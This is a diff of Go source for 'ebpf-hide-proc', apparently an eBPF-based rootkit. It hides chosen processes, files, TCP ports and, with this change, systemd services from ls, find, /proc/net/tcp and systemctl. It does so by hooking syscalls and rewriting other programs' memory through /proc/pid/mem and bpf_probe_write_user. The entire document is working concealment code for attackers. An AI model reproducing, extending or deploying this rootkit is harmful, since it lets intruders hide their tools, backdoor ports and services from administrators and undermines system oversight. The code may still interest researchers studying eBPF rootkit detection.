@@ -1,21 +1,12 @@
 // SPDX-License-Identifier: GPL-2.0
-// ebpf-hide-proc: hide processes, files and network connections
+// ebpf-hide-proc: hide processes, files, network connections and systemd services
 // using eBPF + /proc/pid/mem patching
 //
-// Architecture:
-//   Kernel eBPF:
-//     - hooks getdents64 for process & file hiding
-//     - hooks tcp4/6_seq_show + read for network hiding
-//     - sends events via ringbuf
-//   Go userspace:
-//     - receives events, patches caller memory via /proc/pid/mem
-//
-// Usage:
-//   sudo ./ebpf-hide-proc                              # hide self process
-//   sudo ./ebpf-hide-proc -hide-self-file               # + hide own binary
-//   sudo ./ebpf-hide-proc -hide-file secret.txt         # hide a file
-//   sudo ./ebpf-hide-proc -hide-port 4444               # hide port 4444
-//   sudo ./ebpf-hide-proc -hide-port 22 -hide-port 8080 # hide multiple ports
+// Hiding mechanisms:
+//   1. Process hiding: getdents64 hook + /proc/pid/mem patching
+//   2. File hiding: same getdents64 hook
+//   3. Network hiding (/proc/net/tcp): kprobe tcp4/6_seq_show + read tracepoint
+//   4. Systemd service hiding: write(stdout) tracepoint + service file hiding
 
 package main
 
@@ -44,10 +35,11 @@ const nameMax = 64
 const (
 	evtHidePID  = 1
 	evtHideFile = 2
-	evtHideNet  = 3
+	evtHideNet  = 3 // /proc/net/tcp
+	evtHideSvc  = 4 // systemctl output scrubbing
 )
 
-// Dirent hide event (process + file)
+// Dirent hide event
 type hideEvent struct {
 	EvtType   uint8
 	Pad0      [3]byte
@@ -74,6 +66,17 @@ type netHideEvent struct {
 	RemotePort uint16
 	BufAddr    uint64
 	BufLen     int64
+}
+
+// Service output hide event
+type svcHideEvent struct {
+	EvtType   uint8
+	Pad0      [3]byte
+	CallerPID uint32
+	CallerTID uint32
+	Pad1      uint32
+	BufAddr   uint64
+	BufLen    int64
 }
 
 // Multi-value flags
@@ -110,11 +113,13 @@ func main() {
 	var targetPID int
 	var hideFiles stringSlice
 	var hidePorts intSlice
+	var hideServices stringSlice
 	var hideSelfFile bool
 
 	flag.IntVar(&targetPID, "pid", 0, "PID to hide (default: self)")
 	flag.Var(&hideFiles, "hide-file", "file name to hide (repeatable)")
-	flag.Var(&hidePorts, "hide-port", "TCP port to hide from ss/netstat (repeatable)")
+	flag.Var(&hidePorts, "hide-port", "TCP port to hide from /proc/net/tcp (repeatable)")
+	flag.Var(&hideServices, "hide-service", "systemd service to hide (repeatable, e.g. 'test-hidden.service')")
 	flag.BoolVar(&hideSelfFile, "hide-self-file", false, "hide own binary file")
 	flag.Parse()
 
@@ -128,18 +133,30 @@ func main() {
 		}
 	}
 
+	// Service hiding also hides the .service files from directory listings
+	doSvc := len(hideServices) > 0
+	if doSvc {
+		for _, svc := range hideServices {
+			// Add service file name to file hiding list
+			hideFiles = append(hideFiles, svc)
+		}
+	}
+
 	pidStr := strconv.Itoa(targetPID)
 	doFile := len(hideFiles) > 0
 	doNet := len(hidePorts) > 0
 
-	log.Printf("=== eBPF Process, File & Network Hider Demo ===")
+	log.Printf("=== eBPF Process, File, Network & Service Hider Demo ===")
 	log.Printf("Target PID: %d (%s)", targetPID, pidStr)
 	log.Printf("My PID:     %d", os.Getpid())
 	if doFile {
 		log.Printf("Hide files: %v", []string(hideFiles))
 	}
 	if doNet {
-		log.Printf("Hide ports: %v", []int(hidePorts))
+		log.Printf("Hide ports: %v (proc/net/tcp)", []int(hidePorts))
+	}
+	if doSvc {
+		log.Printf("Hide services: %v (systemctl output + file hiding)", []string(hideServices))
 	}
 
 	if err := rlimit.RemoveMemlock(); err != nil {
@@ -171,7 +188,7 @@ func main() {
 	putU64(objs.PidValMap, 0, pidVal)
 	putU64(objs.PidMaskMap, 0, pidMask)
 
-	// --- File name setup ---
+	// --- File setup ---
 	if doFile {
 		for _, fname := range hideFiles {
 			key, mask := encodeNameU64(fname)
@@ -182,23 +199,63 @@ func main() {
 			if err := objs.FileNameMap.Put(keyBuf, maskBuf); err != nil {
 				log.Fatalf("set file '%s': %v", fname, err)
 			}
-			log.Printf("File match: '%s' key=0x%016x mask=0x%016x", fname, key, mask)
+			log.Printf("File match: '%s' key=0x%016x", fname, key)
 		}
 	}
 
 	// --- Port setup ---
 	if doNet {
 		for _, port := range hidePorts {
-			k := uint32(port)
-			v := uint32(1)
-			if err := objs.HidePortsMap.Put(k, v); err != nil {
+			if err := objs.HidePortsMap.Put(uint32(port), uint32(1)); err != nil {
 				log.Fatalf("set port %d: %v", port, err)
 			}
 		}
 	}
 
+	// --- Service comm filter + name map setup ---
+	if doSvc {
+		// Add "systemctl" to the comm filter map
+		// comm is "systemctl\0" — first 8 bytes: "systemct"
+		commBytes := []byte("systemct")
+		var commKey uint64
+		for i := 0; i < 8 && i < len(commBytes); i++ {
+			commKey |= uint64(commBytes[i]) << (i * 8)
+		}
+		if err := objs.SvcCommMap.Put(commKey, uint32(1)); err != nil {
+			log.Fatalf("set svc comm: %v", err)
+		}
+		log.Printf("Service comm filter: 'systemctl' key=0x%016x", commKey)
+
+		// Populate svc_name_map with service name prefixes (first 8 bytes)
+		for _, svc := range hideServices {
+			var nameKey uint64
+			nameBytes := []byte(svc)
+			for i := 0; i < 8 && i < len(nameBytes); i++ {
+				nameKey |= uint64(nameBytes[i]) << (i * 8)
+			}
+			if err := objs.SvcNameMap.Put(nameKey, uint32(1)); err != nil {
+				log.Fatalf("set svc name '%s': %v", svc, err)
+			}
+			log.Printf("Service name filter: '%s' key=0x%016x", svc, nameKey)
+
+			// Also add without .service suffix
+			base := strings.TrimSuffix(svc, ".service")
+			if base != svc && len(base) > 0 {
+				var baseKey uint64
+				baseBytes := []byte(base)
+				for i := 0; i < 8 && i < len(baseBytes); i++ {
+					baseKey |= uint64(baseBytes[i]) << (i * 8)
+				}
+				if err := objs.SvcNameMap.Put(baseKey, uint32(1)); err != nil {
+					log.Fatalf("set svc base name '%s': %v", base, err)
+				}
+				log.Printf("Service name filter: '%s' key=0x%016x", base, baseKey)
+			}
+		}
+	}
+
 	// --- Feature flags ---
-	objs.FeatureMap.Put(uint32(0), uint32(1)) // pid hiding always on
+	objs.FeatureMap.Put(uint32(0), uint32(1)) // PID hiding always on
 	fileFlag := uint32(0)
 	if doFile {
 		fileFlag = 1
@@ -209,8 +266,13 @@ func main() {
 		netFlag = 1
 	}
 	objs.FeatureMap.Put(uint32(2), netFlag)
+	svcFlag := uint32(0)
+	if doSvc {
+		svcFlag = 1
+	}
+	objs.FeatureMap.Put(uint32(3), svcFlag)
 
-	// --- Attach tracepoints ---
+	// --- Attach getdents64 tracepoints ---
 	tpEnter, err := link.Tracepoint("syscalls", "sys_enter_getdents64",
 		objs.TracepointSysEnterGetdents64, nil)
 	if err != nil {
@@ -225,24 +287,21 @@ func main() {
 	}
 	defer tpExit.Close()
 
-	// --- Attach network hooks (if enabled) ---
+	// --- Attach network hooks ---
 	if doNet {
-		// kprobe tcp4_seq_show
 		kp4, err := link.Kprobe("tcp4_seq_show", objs.KprobeTcp4SeqShow, nil)
 		if err != nil {
 			log.Fatalf("kprobe tcp4_seq_show: %v", err)
 		}
 		defer kp4.Close()
 
-		// kprobe tcp6_seq_show
 		kp6, err := link.Kprobe("tcp6_seq_show", objs.KprobeTcp6SeqShow, nil)
 		if err != nil {
-			log.Printf("kprobe tcp6_seq_show: %v (tcp6 hiding disabled)", err)
+			log.Printf("kprobe tcp6_seq_show: %v (tcp6 proc hiding disabled)", err)
 		} else {
 			defer kp6.Close()
 		}
 
-		// read tracepoints
 		tpReadEnter, err := link.Tracepoint("syscalls", "sys_enter_read",
 			objs.TracepointSysEnterRead, nil)
 		if err != nil {
@@ -258,6 +317,31 @@ func main() {
 		defer tpReadExit.Close()
 	}
 
+	// --- Attach service output hiding hooks ---
+	if doSvc {
+		// Set up tail call: put svc_scan_chunk at index 0 of svc_progs
+		if err := objs.SvcProgs.Put(uint32(0), objs.SvcScanChunk); err != nil {
+			log.Fatalf("set svc tail call: %v", err)
+		}
+		log.Println("service: tail call prog array configured")
+
+		tpWriteEnter, err := link.Tracepoint("syscalls", "sys_enter_write",
+			objs.TracepointSysEnterWrite, nil)
+		if err != nil {
+			log.Fatalf("attach write enter: %v", err)
+		}
+		defer tpWriteEnter.Close()
+		log.Println("service: sys_enter_write attached")
+
+		tpWriteExit, err := link.Tracepoint("syscalls", "sys_exit_write",
+			objs.TracepointSysExitWrite, nil)
+		if err != nil {
+			log.Fatalf("attach write exit: %v", err)
+		}
+		defer tpWriteExit.Close()
+		log.Println("service: sys_exit_write attached")
+	}
+
 	rd, err := ringbuf.NewReader(objs.Events)
 	if err != nil {
 		log.Fatalf("ringbuf: %v", err)
@@ -271,7 +355,10 @@ func main() {
 		log.Printf(">>> Files %v are HIDDEN from ls / find <<<", []string(hideFiles))
 	}
 	if doNet {
-		log.Printf(">>> Ports %v are HIDDEN from ss / netstat <<<", []int(hidePorts))
+		log.Printf(">>> Ports %v are HIDDEN from cat /proc/net/tcp <<<", []int(hidePorts))
+	}
+	if doSvc {
+		log.Printf(">>> Services %v are HIDDEN from systemctl <<<", []string(hideServices))
 	}
 	log.Println()
 	log.Println("Press Ctrl+C to stop.")
@@ -284,7 +371,7 @@ func main() {
 		rd.Close()
 	}()
 
-	pidCnt, fileCnt, netCnt := 0, 0, 0
+	pidCnt, fileCnt, netCnt, svcCnt := 0, 0, 0, 0
 	for {
 		rec, err := rd.Read()
 		if err != nil {
@@ -293,7 +380,6 @@ func main() {
 			}
 			continue
 		}
-
 		if len(rec.RawSample) < 1 {
 			continue
 		}
@@ -310,12 +396,12 @@ func main() {
 				name := string(bytes.TrimRight(ev.DName[:], "\x00"))
 				if evtType == evtHidePID {
 					pidCnt++
-					log.Printf("[hide-pid #%d] Removed '%s' from PID %d's readdir (offset=%d)",
-						pidCnt, name, ev.CallerPID, ev.EntryOff)
+					log.Printf("[hide-pid #%d] Removed '%s' from PID %d's readdir",
+						pidCnt, name, ev.CallerPID)
 				} else {
 					fileCnt++
-					log.Printf("[hide-file #%d] Removed '%s' from PID %d's readdir (offset=%d)",
-						fileCnt, name, ev.CallerPID, ev.EntryOff)
+					log.Printf("[hide-file #%d] Removed '%s' from PID %d's readdir",
+						fileCnt, name, ev.CallerPID)
 				}
 			}
 
@@ -327,15 +413,26 @@ func main() {
 			}
 			if patchNetRead(&nev, hidePorts) {
 				netCnt++
-				log.Printf("[hide-net #%d] Scrubbed port %d (remote %d) from PID %d's read buffer",
-					netCnt, nev.LocalPort, nev.RemotePort, nev.CallerPID)
+				log.Printf("[hide-net #%d] Scrubbed port %d from PID %d's /proc/net/tcp read",
+					netCnt, nev.LocalPort, nev.CallerPID)
 			}
+
+		case evtHideSvc:
+			var sev svcHideEvent
+			if err := binary.Read(bytes.NewReader(rec.RawSample),
+				binary.LittleEndian, &sev); err != nil {
+				continue
+			}
+			// Patching is done in BPF via bpf_probe_write_user before write() executes.
+			// This event is for logging only.
+			svcCnt++
+			log.Printf("[hide-svc #%d] BPF scrubbed service output from PID %d (%d bytes)",
+				svcCnt, sev.CallerPID, sev.BufLen)
 		}
 	}
-	log.Printf("Total hides: pid=%d file=%d net=%d", pidCnt, fileCnt, netCnt)
+	log.Printf("Total hides: pid=%d file=%d net=%d svc=%d", pidCnt, fileCnt, netCnt, svcCnt)
 }
 
-// encodeNameU64 encodes a file name's first 8 bytes as a u64 key
 func encodeNameU64(name string) (val, mask uint64) {
 	nameBytes := []byte(name + "\x00")
 	n := len(nameBytes)
@@ -350,7 +447,6 @@ func encodeNameU64(name string) (val, mask uint64) {
 	return
 }
 
-// patchDirent patches getdents64 buffer to hide a dirent entry
 func patchDirent(ev *hideEvent) bool {
 	f, err := os.OpenFile(fmt.Sprintf("/proc/%d/mem", ev.CallerPID), os.O_RDWR, 0)
 	if err != nil {
@@ -370,24 +466,21 @@ func patchDirent(ev *hideEvent) bool {
 		_, err := f.WriteAt(buf, addr)
 		return err == nil
 	}
-
 	_, err = f.WriteAt(make([]byte, 8), int64(ev.BufAddr+ev.EntryOff))
 	return err == nil
 }
 
-// patchNetRead patches the userspace read buffer to remove lines matching hidden ports
+// patchNetRead: patch /proc/net/tcp read buffer (text lines)
 func patchNetRead(nev *netHideEvent, ports intSlice) bool {
 	if nev.BufLen <= 0 || nev.BufLen > 1024*1024 {
 		return false
 	}
-
 	f, err := os.OpenFile(fmt.Sprintf("/proc/%d/mem", nev.CallerPID), os.O_RDWR, 0)
 	if err != nil {
 		return false
 	}
 	defer f.Close()
 
-	// Read the buffer content
 	buf := make([]byte, nev.BufLen)
 	n, err := f.ReadAt(buf, int64(nev.BufAddr))
 	if err != nil || n == 0 {
@@ -395,33 +488,33 @@ func patchNetRead(nev *netHideEvent, ports intSlice) bool {
 	}
 	buf = buf[:n]
 
-	// Build port hex strings to match (format: ":XXXX " in /proc/net/tcp)
 	portHexes := make([]string, 0, len(ports))
 	for _, p := range ports {
 		portHexes = append(portHexes, fmt.Sprintf(":%04X ", p))
 	}
 
-	// Process line by line
 	patched := false
 	lines := bytes.Split(buf, []byte("\n"))
+	offset := int64(0)
 	for i, line := range lines {
 		if len(line) == 0 {
+			if i < len(lines)-1 {
+				offset += 1 // just the \n
+			}
 			continue
 		}
 		lineStr := string(line)
 		for _, ph := range portHexes {
 			if strings.Contains(lineStr, ph) {
-				// Replace line content with spaces (preserve length and newline position)
 				replacement := bytes.Repeat([]byte(" "), len(line))
-				offset := int64(0)
-				for j := 0; j < i; j++ {
-					offset += int64(len(lines[j])) + 1 // +1 for \n
-				}
 				f.WriteAt(replacement, int64(nev.BufAddr)+offset)
 				patched = true
 				break
 			}
 		}
+		offset += int64(len(line)) + 1
 	}
 	return patched
 }
+
+
